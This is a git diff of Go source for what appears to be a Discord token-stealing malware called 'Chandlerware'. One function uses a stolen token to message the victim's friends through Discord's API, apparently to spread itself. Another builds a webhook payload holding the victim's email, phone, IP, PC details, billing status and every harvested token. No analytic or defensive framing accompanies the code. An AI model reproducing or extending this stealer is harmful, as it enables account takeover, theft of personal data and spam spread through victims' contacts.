@@ -93,18 +93,24 @@ func spred() {
 			fmt.Println(err1)
 		}
 
-		for _, user := range Friends {
-			data := []byte(`{content: "test"}`)
-			req, wth := http.NewRequest("POST", "https://discord.com/api/v9/channels/890645161795792946/messages", bytes.NewBuffer(data))
+		for i, user := range Friends {
+			fmt.Printf("%s: %v\n", string(rune(i)), user)
+			data := []byte(`{
+				'content': "this is an atumated msg",
+				'tts': false
+			}`)
+			req, wth := http.NewRequest("POST", "https://discord.com/api/v9/channels/758070785993867356/messages", bytes.NewBuffer(data))
 			if wth != nil {
 				fmt.Println(wth)
 			}
 			req.Header.Set("Authorization", token)
+			fmt.Println(token)
 			cl := &http.Client{}
 			res, err := cl.Do(req)
-			if err != nil {
-				fmt.Print("test %s", user.Id)
+			if err == nil {
 				fmt.Println(string(res.StatusCode) + " " + res.Status)
+			} else {
+				fmt.Println("ets")
 			}
 
 			res.Body.Close()
@@ -180,8 +186,8 @@ func grabTokenInformation(token string) (data string, jsonEmbed string) {
 		}
 	}
 
-	// data = `[{"Username": "` + discordUser + `", "Email": "` + discordEmail + `", "Phone": "` + discordPhone + `", "Nitro": "` + discordNitro + `", "Ip": "` + ip + `", "DisplayName": "` + currentUser.Name + `", "PCUsername": "` + strings.Split(currentUser.Username, "\\")[1] + `", "OS": "` + osName + `", "CPUArch": "` + cpuArch + `"}]`
-	fmt.Print(data)
+	//data = `[{"Username": "` + discordUser + `", "Email": "` + discordEmail + `", "Phone": "` + discordPhone + `", "Nitro": "` + discordNitro + `", "Ip": "` + ip + `", "DisplayName": "` + currentUser.Name + `", "PCUsername": "` + strings.Split(currentUser.Username, "\\")[1] + `", "OS": "` + osName + `", "CPUArch": "` + cpuArch + `"}]`
+	//fmt.Print(data)
 	jsonEmbed = "{\"avatar_url\":\"https://bbk12e1-cdn.myschoolcdn.com/ftpimages/1085/user/large_user6059886_4392615_368.jpg?resize=200,200\",\"embeds\":[{\"thumbnail\":{\"url\":\"" + discordAvatar + "\"},\"color\":3447003,\"footer\":{\"text\":\"" + time.Now().Format("2006.01.02 15:04:05") + "\"},\"author\":{\"name\":\"" + discordUser + "\"},\"fields\":[{\"inline\":true,\"name\":\"Account Info\",\"value\":\"Email: " + discordEmail + "\\nPhone: " + discordPhone + "\\nNitro: " + discordNitro + "\\nBilling Info: " + discordNitro + "\"},{\"inline\":true,\"name\":\"PC Info\",\"value\":\"IP: " + ip + "\\nDisplayName: " + displayName + "\\nUsername: " + strings.Split(currentUser.Username, "\\")[1] + "\\nOS: " + osName + "\\nCPU Arch: " + cpuArch + "\"},{\"name\":\"** Discord Token**\",\"value\":\"```" + token + "```\"},{\"name\":\"**All tokens**\",\"value\":\"```" + strings.Join(tokens, " || ") + "```\"}]}],\"username\":\"" + "Chandlerware" + "\"}"
 	return
 }
